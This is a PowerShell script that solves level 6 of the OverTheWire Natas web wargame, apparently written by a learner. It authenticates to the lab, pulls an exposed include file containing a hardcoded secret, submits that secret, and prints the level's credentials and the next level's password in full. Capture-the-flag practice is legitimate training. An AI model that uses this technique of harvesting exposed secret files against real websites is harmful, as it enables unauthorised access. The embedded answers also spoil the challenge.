
<#
Script to retrieve the password of level 6-7

#>
$url = "http://natas6.natas.labs.overthewire.org "
$creds = "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

Invoke-WebRequest -uri $url -Method Get -Headers $headers -Outfile temp.text

get-content ./temp.text | Select-String -pattern "(\w{20,})" > res 


<#
    We see that there is some file and there is some form to fill

    <div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>


#>

remove-Item res
remove-Item temp.text



#let us get the file
#1 $url =  "http://natas6.natas.labs.overthewire.org/includes/secret.inc"

#2 include "includes/secret.inc";

#     if(array_key_exists("submit", $_POST)) {
#         if($secret == $_POST['secret']) {
#         print "Access granted. The password for natas7 is <censored>";
#     } else {
#         print "Wrong secret";
#     }
#     }
# ?>

# <form method=post>
# Input secret: <input name=secret><br>
# <input type=submit name=submit>
# </form>


# 3We get this <? $secret = "FOEIUWGHFEEUHOFUOIU"; ?>

#The 3 steps are above



<###########################################################################

                        Used this to clean up html entities in the previous steps

Invoke-WebRequest -uri $url -Method Get -Headers $headers -Outfile "scr-file"

$content = get-content("scr-file")
$clean =[System.Web.HttpUtility]::HtmlDecode($content)

$clean = $clean.split("<br />")

set-content -path "scr-file" -value $clean

###############################################################################>

<#Making the post request#>
$parms = @{"secret" = "FOEIUWGHFEEUHOFUOIU"; "submit" = "submit quiery"}

$resp = Invoke-WebRequest -uri $url -Method Post  -Headers $headers -Body $parms -proxy "http://localhost:8080"

$daPass = ($resp | Select-String -allMatches "(\w{15,})").matches.value[1]


Write-host "The password for natas7 is $daPass"




<#

PS /home/voltron/OTW/natas/pshell_lang>  ./natas7.ps1                                                              
The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9                                                       
PS /home/voltron/OTW/natas/pshell_lang>  

#>

